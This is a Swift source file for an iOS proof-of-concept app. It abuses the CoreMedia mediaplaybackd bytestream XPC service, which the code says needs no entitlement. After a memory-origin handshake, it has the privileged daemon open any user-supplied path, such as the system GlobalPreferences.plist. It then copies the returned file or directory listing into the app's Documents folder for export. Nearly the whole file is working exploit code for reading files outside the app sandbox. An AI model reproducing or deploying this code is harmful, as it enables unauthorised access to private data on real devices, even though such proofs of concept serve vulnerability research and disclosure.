//
//  ContentView.swift
//  MConfPoC
//
//  CoreMedia bytestream PoC.
//  Runs only on explicit Run-button press. The target path is supplied in the UI.
//  Results and short execution messages are saved inside Documents/.
//

import Foundation
import SwiftUI
import UIKit
import Darwin
import CoreFoundation

// MARK: - Logging

private let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!
private var logFd: Int32 = -1

private func resetSessionLogFile() {
    let path = docs.appendingPathComponent("run.log").path
    let fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0o644)
    if fd >= 0 { close(fd) }
}

private func openLog() {
    if logFd >= 0 { close(logFd); logFd = -1 }
    let path = docs.appendingPathComponent("run.log").path
    // Keep all runs from the current app session in the same log file.
    logFd = open(path, O_WRONLY | O_CREAT | O_APPEND, 0o644)
}

private final class EHBox {
    var desc = ""
    var seen = false
}

/// Releases the +1 CoreFoundation-style reference returned by a Fig *Create/Complete API.
private func releaseFigReference(_ pointer: UnsafeMutableRawPointer?) {
    guard let pointer else { return }
    Unmanaged<CFTypeRef>.fromOpaque(pointer).release()
}

// MARK: - ContentView

private let legacyTargetPath = "/private/var/mobile/Library/Preferences/.GlobalPreferences.plist"

/// Builds a safe local output filename without restricting the requested input path.
private func outputFilename(for targetPath: String) -> String {
    let name = URL(fileURLWithPath: targetPath).lastPathComponent
    let safeName = name.isEmpty || name == "/" ? "target.bin" : name
    return safeName
}

private func recoveredFileURL(for targetPath: String) -> URL {
    let filename = targetPath == legacyTargetPath
        ? "GlobalPreferences.plist"
        : outputFilename(for: targetPath)
    return docs.appendingPathComponent(filename)
}

private func recoveredDirectoryURL(for targetPath: String) -> URL {
    docs.appendingPathComponent(outputFilename(for: targetPath) + ".directory.txt")
}

private struct ActivityView: UIViewControllerRepresentable {
    let activityItems: [Any]

    func makeUIViewController(context: Context) -> UIActivityViewController {
        UIActivityViewController(activityItems: activityItems, applicationActivities: nil)
    }

    func updateUIViewController(_ controller: UIActivityViewController, context: Context) {}
}

struct ContentView: View {
    @State private var status = "Ready"
    @State private var isRunning = false
    @State private var targetPath = ""
    @State private var logs: [String] = []
    @State private var showExport = false
    @State private var resultURL: URL? = nil
    @State private var didResetSessionLog = false

    private let panelColor = Color(uiColor: .secondarySystemBackground)
    private let panelShape = RoundedRectangle(cornerRadius: 20, style: .continuous)

    var body: some View {
        GeometryReader { geometry in
            VStack(alignment: .leading, spacing: 14) {
                VStack(alignment: .leading, spacing: 10) {
                    Text("CoreMedia PoC")
                        .font(.headline)
                    Text(status)
                        .font(.system(.footnote, design: .monospaced))
                        .foregroundStyle(.secondary)
                }

                VStack(alignment: .leading, spacing: 6) {
                    Text("Target path")
                        .font(.footnote)
                        .foregroundStyle(.secondary)
                    TextField("Enter target path", text: $targetPath)
                        .font(.system(.body, design: .monospaced))
                        .textInputAutocapitalization(.never)
                        .autocorrectionDisabled()
                        .textFieldStyle(.plain)
                        .padding(.horizontal, 14)
                        .padding(.vertical, 16)
                        .background(panelColor)
                        .clipShape(panelShape)
                        .overlay(panelShape.stroke(Color.white.opacity(0.07), lineWidth: 1))
                }

                Button {
                    guard !isRunning else { return }
                    isRunning = true
                    status = "Running…"
                    resultURL = nil
                    if !logs.isEmpty {
                        logs.append("──────── New run ────────")
                    }
                    let requestedPath = targetPath
                    let trimmedPath = requestedPath.trimmingCharacters(in: .whitespacesAndNewlines)
                    let expectedResultURL = recoveredFileURL(for: trimmedPath)
                    let expectedDirectoryURL = recoveredDirectoryURL(for: trimmedPath)
                    DispatchQueue.global(qos: .userInitiated).async {
                        runChain(targetPath: requestedPath) { line in
                            DispatchQueue.main.async {
                                logs.append(line)
                                if line.hasPrefix("Saved directory listing "),
                                   FileManager.default.fileExists(atPath: expectedDirectoryURL.path) {
                                    resultURL = expectedDirectoryURL
                                } else if line.hasPrefix("Saved "),
                                          FileManager.default.fileExists(atPath: expectedResultURL.path) {
                                    resultURL = expectedResultURL
                                }
                            }
                        }
                        DispatchQueue.main.async {
                            isRunning = false
                            status = "Finished — see Documents/run.log"
                        }
                    }
                } label: {
                    ZStack {
                        Text("Run")
                            .font(.system(size: 18, weight: .medium))
                            .foregroundStyle(.white)
                    }
                    .frame(maxWidth: .infinity)
                    .frame(height: 58)
                    .contentShape(panelShape)
                }
                .buttonStyle(.plain)
                .background(Color(uiColor: .systemBlue), in: panelShape)
                .overlay(panelShape.stroke(Color.white.opacity(0.07), lineWidth: 1))
                .disabled(isRunning)

                HStack {
                    Text("Run Log")
                        .font(.headline)
                        .foregroundStyle(.secondary)
                    Spacer()
                    Button("Clear", role: .destructive) {
                        logs.removeAll()
                        resetSessionLogFile()
                    }
                    .disabled(isRunning)
                }

                ScrollViewReader { proxy in
                    ScrollView {
                        VStack(alignment: .leading, spacing: 5) {
                            ForEach(Array(logs.enumerated()), id: \.offset) { index, line in
                                Text(line)
                                    .font(.system(.caption, design: .monospaced))
                                    .frame(maxWidth: .infinity, alignment: .leading)
                                    .id(index)
                            }
                        }
                        .frame(maxWidth: .infinity, alignment: .leading)
                        .padding(12)
                    }
                    .onChange(of: logs.count) { _ in
                        if let lastIndex = logs.indices.last {
                            proxy.scrollTo(lastIndex, anchor: .bottom)
                        }
                    }
                }
                .frame(maxWidth: .infinity, maxHeight: .infinity)
                .background(panelColor)
                .clipShape(panelShape)
                .overlay(panelShape.stroke(Color.white.opacity(0.07), lineWidth: 1))

                Button {
                    guard resultURL != nil else { return }
                    showExport = true
                } label: {
                    Label("Export result", systemImage: "square.and.arrow.up")
                        .font(.body.weight(.medium))
                        .foregroundStyle(.primary)
                        .frame(maxWidth: .infinity)
                        .frame(height: 50)
                        .contentShape(RoundedRectangle(cornerRadius: 16, style: .continuous))
                }
                .buttonStyle(.plain)
                .background(panelColor, in: RoundedRectangle(cornerRadius: 16, style: .continuous))
                .overlay(RoundedRectangle(cornerRadius: 16, style: .continuous).stroke(Color.white.opacity(0.07), lineWidth: 1))
                .disabled(resultURL == nil || isRunning)
                .opacity(resultURL == nil || isRunning ? 0.45 : 1)
            }
            .padding(.horizontal)
            .padding(.top, 84)
            .padding(.bottom, 8)
            .frame(width: geometry.size.width, height: geometry.size.height, alignment: .top)
        }
        .background(Color.black.ignoresSafeArea())
        .preferredColorScheme(.dark)
        .onAppear {
            guard !didResetSessionLog else { return }
            resetSessionLogFile()
            didResetSessionLog = true
        }
        .sheet(isPresented: $showExport) {
            if let resultURL = resultURL {
                ActivityView(activityItems: [resultURL])
            }
        }
    }
}

// MARK: - The chain

private func runChain(targetPath requestedPath: String, onLog: @escaping (String) -> Void) {
    openLog()
    defer { if logFd >= 0 { close(logFd); logFd = -1 } }
    func logLine(_ message: String) {
        let line = message + "\n"
        if logFd >= 0 { _ = line.withCString { write(logFd, $0, strlen($0)) } }
        onLog(message)
    }
    logLine("Run started")
    let dev = UIDevice.current
    logLine("Device: \(dev.model), iOS \(dev.systemVersion)")

    let targetPath = requestedPath.trimmingCharacters(in: .whitespacesAndNewlines)
    guard !targetPath.isEmpty, targetPath.hasPrefix("/") else {
        logLine("Invalid target: enter an absolute file or directory path")
        logLine("Run finished")
        return
    }
    let outputName = targetPath == legacyTargetPath
        ? "GlobalPreferences.plist"
        : outputFilename(for: targetPath)
    logLine("Target: \(targetPath)")

    // Step 1 — resolve symbols.
    guard let cm = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia", RTLD_NOW | RTLD_LOCAL) else {
        logLine("CoreMedia load failed"); return
    }
    let rtld = UnsafeMutableRawPointer(bitPattern: -2)
    guard let pBasic = dlsym(cm, "FigXPCCreateBasicMessage"),
          let pBegin = dlsym(cm, "FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1"),
          let pComp  = dlsym(cm, "FigMemoryOriginCompleteEstablishingMemoryRecipientUsingXPCMessage2"),
          let pRecip = dlsym(cm, "FigMemoryRecipientCreateWithXPCMessage1AndUpdateXPCMessage2"),
          let pSetURL = dlsym(cm, "FigXPCMessageSetCFURL"),
          let pConnCreate = dlsym(rtld, "xpc_connection_create_mach_service"),
          let pSetEH = dlsym(rtld, "xpc_connection_set_event_handler"),
          let pResume = dlsym(rtld, "xpc_connection_resume"),
          let pConnCancel = dlsym(rtld, "xpc_connection_cancel"),
          let pSendReply = dlsym(rtld, "xpc_connection_send_message_with_reply"),
          let pVal = dlsym(rtld, "xpc_dictionary_get_value"),
          let pU64 = dlsym(rtld, "xpc_dictionary_get_uint64"),
          let pSetU64 = dlsym(rtld, "xpc_dictionary_set_uint64"),
          let pDupFd = dlsym(rtld, "xpc_dictionary_dup_fd"),
          let pGetData = dlsym(rtld, "xpc_dictionary_get_data"),
          let pI64 = dlsym(rtld, "xpc_dictionary_get_int64"),
          let pSetI64 = dlsym(rtld, "xpc_dictionary_set_int64"),
          let pDesc = dlsym(rtld, "xpc_copy_description"),
          let pType = dlsym(rtld, "xpc_get_type"),
          let pTypeName = dlsym(rtld, "xpc_type_get_name"),
          let pRetain = dlsym(rtld, "xpc_retain"),
          let pRel = dlsym(rtld, "xpc_release") else {
        logLine("Required symbol missing"); return
    }

    typealias FBasic = @convention(c) (UInt32, UInt64, UnsafeMutablePointer<UnsafeMutableRawPointer?>?) -> Int32
    typealias FBegin = @convention(c) (UnsafeMutableRawPointer?) -> Int32
    typealias FComp = @convention(c) (OpaquePointer?, UnsafeMutablePointer<UnsafeMutableRawPointer?>?) -> Int32
    typealias FRecip = @convention(c) (OpaquePointer?, UnsafeMutableRawPointer?, UnsafePointer<CChar>?, UnsafeMutablePointer<UnsafeMutableRawPointer?>?) -> Int32
    typealias FSetURL = @convention(c) (UnsafeMutableRawPointer?, UnsafePointer<CChar>, UnsafeRawPointer?) -> Int32
    typealias FConnCreate = @convention(c) (UnsafePointer<CChar>, UnsafeMutableRawPointer?, UInt64) -> UnsafeMutableRawPointer?
    typealias FSetEH = @convention(c) (UnsafeMutableRawPointer?, AnyObject) -> Void
    typealias FResume = @convention(c) (UnsafeMutableRawPointer?) -> Void
    typealias FConnCancel = @convention(c) (UnsafeMutableRawPointer?) -> Void
    typealias FSendReply = @convention(c) (UnsafeMutableRawPointer?, UnsafeMutableRawPointer?, UnsafeMutableRawPointer?, AnyObject) -> Void
    typealias FVal = @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> OpaquePointer?
    typealias FU64 = @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> UInt64
    typealias FSetU64 = @convention(c) (OpaquePointer?, UnsafePointer<CChar>, UInt64) -> Void
    typealias FDupFd = @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> Int32
    typealias FGetData = @convention(c) (OpaquePointer?, UnsafePointer<CChar>, UnsafeMutablePointer<Int>?) -> UnsafeRawPointer?
    typealias FI64 = @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> Int64
    typealias FSetI64 = @convention(c) (OpaquePointer?, UnsafePointer<CChar>, Int64) -> Void
    typealias FDesc = @convention(c) (OpaquePointer?) -> UnsafeMutablePointer<CChar>?
    typealias FType = @convention(c) (OpaquePointer?) -> OpaquePointer?
    typealias FTypeName = @convention(c) (OpaquePointer?) -> UnsafePointer<CChar>?
    typealias FRetain = @convention(c) (OpaquePointer?) -> Void
    typealias FRel = @convention(c) (OpaquePointer?) -> Void

    let fBasic = unsafeBitCast(pBasic, to: FBasic.self)
    let fBegin = unsafeBitCast(pBegin, to: FBegin.self)
    let fComp = unsafeBitCast(pComp, to: FComp.self)
    let fRecip = unsafeBitCast(pRecip, to: FRecip.self)
    let fSetURL = unsafeBitCast(pSetURL, to: FSetURL.self)
    let fConnCreate = unsafeBitCast(pConnCreate, to: FConnCreate.self)
    let fSetEH = unsafeBitCast(pSetEH, to: FSetEH.self)
    let fResume = unsafeBitCast(pResume, to: FResume.self)
    let fConnCancel = unsafeBitCast(pConnCancel, to: FConnCancel.self)
    let fSendReply = unsafeBitCast(pSendReply, to: FSendReply.self)
    let fVal = unsafeBitCast(pVal, to: FVal.self)
    let fU64 = unsafeBitCast(pU64, to: FU64.self)
    let fSetU64 = unsafeBitCast(pSetU64, to: FSetU64.self)
    let fDupFd = unsafeBitCast(pDupFd, to: FDupFd.self)
    let fGetData = unsafeBitCast(pGetData, to: FGetData.self)
    let fI64 = unsafeBitCast(pI64, to: FI64.self)
    let fSetI64 = unsafeBitCast(pSetI64, to: FSetI64.self)
    let fDesc = unsafeBitCast(pDesc, to: FDesc.self)
    let fType = unsafeBitCast(pType, to: FType.self)
    let fTypeName = unsafeBitCast(pTypeName, to: FTypeName.self)
    let fRetain = unsafeBitCast(pRetain, to: FRetain.self)
    let fRel = unsafeBitCast(pRel, to: FRel.self)

    func desc(_ o: OpaquePointer?) -> String {
        guard let o = o, let c = fDesc(o) else { return "nil" }
        defer { free(c) }
        return String(cString: c).replacingOccurrences(of: "\n", with: " ")
    }
    func typeName(_ o: OpaquePointer?) -> String {
        guard let o = o, let t = fType(o), let n = fTypeName(t) else { return "?" }
        return String(cString: n)
    }

    // Step 2 — connect (no entitlement required).
    guard let conn = "com.apple.coremedia.mediaplaybackd.bytestream.xpc".withCString({ fConnCreate($0, nil, 0) }) else {
        logLine("XPC connection failed"); return
    }
    let ehBox = EHBox()
    let eh: @convention(block) (UnsafeMutableRawPointer?) -> Void = { obj in
        guard let obj = obj else { return }
        ehBox.desc = "\(typeName(OpaquePointer(obj))): \(String(desc(OpaquePointer(obj)).prefix(200)))"
        ehBox.seen = true
    }
    fSetEH(conn, eh as AnyObject)
    fResume(conn)
    logLine("XPC connected")

    // Each Run owns one XPC session. Leaving it active makes the next Run's
    // memory-origin handshake collide with the still-live previous session.
    // Cancel first, then release the xpc_connection_t after all requests finish.

    func send(_ m: UnsafeMutableRawPointer?) -> (OpaquePointer?, String) {
        guard let m = m else { return (nil, "nil") }
        let sem = DispatchSemaphore(value: 0)
        var out: OpaquePointer? = nil
        var tn = "?"
        let hb: @convention(block) (UnsafeMutableRawPointer?) -> Void = { obj in
            guard let obj = obj else { sem.signal(); return }
            tn = typeName(OpaquePointer(obj))
            if tn == "dictionary" || tn == "error" {
                fRetain(OpaquePointer(obj))
                out = OpaquePointer(obj)
            }
            sem.signal()
        }
        fSendReply(conn, m, nil, hb as AnyObject)
        if sem.wait(timeout: .now() + 8) != .success { return (nil, "timeout-8s") }
        return (out, tn)
    }

    // Step 3 — memory-origin handshake.
    // Both Fig APIs below follow Create-rule ownership: keep their +1 refs alive
    // for the stream lifetime, then release them before cancelling the XPC session.
    var memoryRecipient: UnsafeMutableRawPointer? = nil
    var memoryOrigin: UnsafeMutableRawPointer? = nil

    var rp2Ready = false
    var handshakeReady = false

    var rp1Msg: UnsafeMutableRawPointer? = nil
    if fBasic(0x2e727031, 0, &rp1Msg) == 0, let m1 = rp1Msg {           // '.rp1'
        let (r1, t1) = send(m1)
        let replyDetail = (t1 == "error") ? " — \(desc(r1))" : ""
        logLine("Handshake 1: \(t1)\(replyDetail)")
        fRel(OpaquePointer(m1))

        if let r1 = r1, t1 == "dictionary" {
            var rp2Msg: UnsafeMutableRawPointer? = nil
            if fBasic(0x2e727032, 0, &rp2Msg) == 0, let m2 = rp2Msg {   // '.rp2'
                let cr = "mconf".withCString { fRecip(r1, m2, $0, &memoryRecipient) }
                logLine("Recipient creation: status=\(cr), object=\(memoryRecipient == nil ? "nil" : "present")")

                if cr == 0, memoryRecipient != nil {
                    let (r2, t2) = send(m2)
                    let replyDetail2 = (t2 == "error") ? " — \(desc(r2))" : ""
                    logLine("Handshake 2: \(t2)\(replyDetail2)")
                    rp2Ready = (t2 == "dictionary" && r2 != nil)
                    if let r2 = r2 { fRel(r2) }
                } else {
                    logLine("Handshake 2 skipped: memory recipient was not created")
                }
                fRel(OpaquePointer(m2))
            } else {
                logLine("Handshake 2 message creation failed")
            }
            fRel(r1)
        }
    } else {
        logLine("Handshake 1 message creation failed")
    }

    if rp2Ready {
        var orgMsg: UnsafeMutableRawPointer? = nil
        if fBasic(0x2e6f7267, 0, &orgMsg) == 0, let om = orgMsg {       // '.org'
            let bg = fBegin(om)
            logLine("Origin begin: status=\(bg)")
            if bg == 0 {
                let (or, ot) = send(om)
                let originReplyDetail = (ot == "error") ? " — \(desc(or))" : ""
                logLine("Origin: \(ot)\(originReplyDetail)")
                if let or = or {
                    if ot == "dictionary" {
                        let cp = fComp(or, &memoryOrigin)
                        handshakeReady = (cp == 0 && memoryOrigin != nil)
                        logLine("Origin established: \(handshakeReady ? "yes" : "no (status=\(cp))")")
                    } else {
                        logLine("Origin response was not a dictionary")
                    }
                    fRel(or)
                }
            } else {
                logLine("Origin begin failed; .org request skipped")
            }
            fRel(OpaquePointer(om))
        } else {
            logLine("Origin message creation failed")
        }
    } else {
        logLine("Origin handshake skipped: .rp1/.rp2 did not complete")
    }

    // Render the entries already present in a directory FD directly in Run Log.
    func directoryEntryName(_ entry: UnsafeMutablePointer<dirent>) -> String {
        let capacity = MemoryLayout.size(ofValue: entry.pointee.d_name)
        return withUnsafePointer(to: &entry.pointee.d_name) { namePointer in
            namePointer.withMemoryRebound(to: CChar.self, capacity: capacity) {
                String(cString: $0)
            }
        }
    }

    func describeEntryType(_ mode: mode_t) -> String {
        switch mode & mode_t(S_IFMT) {
        case mode_t(S_IFDIR): return "DIR"
        case mode_t(S_IFREG): return "FILE"
        case mode_t(S_IFLNK): return "SYMLINK"
        case mode_t(S_IFCHR): return "CHAR"
        case mode_t(S_IFBLK): return "BLOCK"
        case mode_t(S_IFIFO): return "FIFO"
        case mode_t(S_IFSOCK): return "SOCKET"
        default: return "OTHER"
        }
    }

    func escapedEntryName(_ name: String) -> String {
        name.replacingOccurrences(of: "\\", with: "\\\\")
            .replacingOccurrences(of: "\t", with: "\\t")
            .replacingOccurrences(of: "\n", with: "\\n")
            .replacingOccurrences(of: "\r", with: "\\r")
    }

    func saveDirectoryListing(fd: Int32, outputName: String) {
        guard let directory = fdopendir(fd) else {
            let savedErrno = errno
            close(fd)
            logLine("Directory stream creation failed: errno=\(savedErrno)")
            return
        }
        defer { closedir(directory) }

        let directoryFD = dirfd(directory)
        var entries: [(name: String, type: String?, size: Int64?)] = []
        let maximumEntries = 10_000
        var reachedLimit = false
        var readError: Int32 = 0

        while true {
            errno = 0
            guard let entry = readdir(directory) else {
                readError = errno
                break
            }
            let name = directoryEntryName(entry)
            if name == "." || name == ".." { continue }
            if entries.count >= maximumEntries {
                reachedLimit = true
                break
            }

            var itemStat = stat()
            let statResult = name.withCString {
                fstatat(directoryFD, $0, &itemStat, AT_SYMLINK_NOFOLLOW)
            }
            if statResult == 0 {
                entries.append((name, describeEntryType(itemStat.st_mode), Int64(itemStat.st_size)))
            } else {
                // When metadata is unavailable, show the entry name without UNKNOWN or ? placeholders.
                entries.append((name, nil, nil))
            }
        }

        entries.sort { $0.name.localizedStandardCompare($1.name) == .orderedAscending }
        logLine("Directory entries (\(entries.count)):")
        var manifestLines = ["Type\tSize\tName"]
        for entry in entries {
            let safeName = escapedEntryName(entry.name)
            let renderedLine: String
            if let type = entry.type, let size = entry.size {
                renderedLine = "\(type)\t\(size)\t\(safeName)"
            } else {
                renderedLine = safeName
            }
            manifestLines.append(renderedLine)
            logLine(renderedLine)
        }
        if reachedLimit {
            manifestLines.append("TRUNCATED\t-\tEntry limit: \(maximumEntries)")
            logLine("Directory listing truncated at \(maximumEntries) entries")
        }
        if readError != 0 {
            manifestLines.append("READ_ERROR\t-\terrno=\(readError)")
            logLine("Directory enumeration ended with errno=\(readError)")
        }

        let output = docs.appendingPathComponent(outputName)
        do {
            try (manifestLines.joined(separator: "\n") + "\n").write(
                to: output,
                atomically: true,
                encoding: .utf8
            )
            logLine("Saved directory listing \(entries.count) entries: \(outputName)")
        } catch {
            logLine("Directory listing save failed: \(error.localizedDescription)")
        }
    }

    // Save an ordinary file byte-for-byte, or show a directory's immediate entries.
    func takeFd(_ outputName: String, directoryOutputName: String, fd: Int32) {
        var st = stat()
        guard fstat(fd, &st) == 0 else {
            let savedErrno = errno
            close(fd)
            logLine("File descriptor check failed: errno=\(savedErrno)")
            return
        }

        let fileType = st.st_mode & mode_t(S_IFMT)
        if fileType == mode_t(S_IFDIR) {
            logLine("Target is a directory; listing entries")
            saveDirectoryListing(fd: fd, outputName: directoryOutputName)
            return
        }

        guard fileType == mode_t(S_IFREG) else {
            close(fd)
            logLine("Target is neither a regular file nor a directory")
            return
        }

        defer { close(fd) }
        let size = Int64(st.st_size)
        guard size > 0 else {
            logLine("Unexpected file size: \(size)")
            return
        }
        guard size <= Int64(Int.max) else {
            logLine("File is too large to read into memory: \(size) bytes")
            return
        }
        var buffer = [UInt8](repeating: 0, count: Int(size))
        let count = pread(fd, &buffer, buffer.count, 0)
        guard count > 0 else {
            logLine("File read failed: errno=\(errno)")
            return
        }
        let output = docs.appendingPathComponent(outputName)
        do {
            try Data(buffer.prefix(count)).write(to: output, options: .atomic)
            logLine("Saved \(count) bytes: \(outputName)")
        } catch {
            logLine("Save failed: \(error.localizedDescription)")
        }
    }

    // 'Curl' probe: let the daemon open `path` and hand back the fd.
    func probe(_ path: String, outputName: String, directoryOutputName: String) {
        let cfURL = URL(fileURLWithPath: path) as CFURL
        var msg: UnsafeMutableRawPointer? = nil
        guard fBasic(0x4375726c, 0, &msg) == 0, let m = msg else {       // 'Curl'
            logLine("Request message failed"); return
        }
        _ = fSetURL(m, "CreationURL", Unmanaged.passUnretained(cfURL).toOpaque())
        fSetU64(OpaquePointer(m), "FileOpenOptions", 0)
        let (rp, rt) = send(m)
        fRel(OpaquePointer(m))
        guard rt == "dictionary", let rp = rp else {
            logLine("Request failed: \(rt)"); if let rp = rp { fRel(rp) }; return
        }
        guard let details = fVal(rp, "ByteStreamDetails") else {
            let err = fI64(rp, ".ErrorReturn")
            logLine("Access denied (\(err))")
            fRel(rp); return
        }
        let oid = fU64(details, "ObjectID")
        logLine("Stream opened")
        let fd = fDupFd(details, "FileDescriptor")
        if fd >= 0 {
            logLine("File descriptor received")
            takeFd(outputName, directoryOutputName: directoryOutputName, fd: fd)
        } else {
            logLine("No file descriptor returned")
        }


        // close the stream server-side
        var mD: UnsafeMutableRawPointer? = nil
        if fBasic(0x646f6f6d, oid, &mD) == 0, let mD = mD {
            let (rd, _) = send(mD)
            if let rd = rd { fRel(rd) }
            fRel(OpaquePointer(mD))
        }
        fRel(rp)
    }

    if handshakeReady {
        let directoryOutputName = outputFilename(for: targetPath) + ".directory.txt"
        probe(targetPath, outputName: outputName, directoryOutputName: directoryOutputName)
    } else {
        logLine("Read skipped: memory-origin handshake was not established")
    }

    // Drop Fig-side state before closing the XPC transport. This prevents one
    // completed Run from leaving an origin/recipient attached to this process.
    releaseFigReference(memoryOrigin)
    memoryOrigin = nil
    releaseFigReference(memoryRecipient)
    memoryRecipient = nil

    fConnCancel(conn)
    fRel(OpaquePointer(conn))
    logLine("XPC connection cancelled and released")
    logLine("Run finished")
}
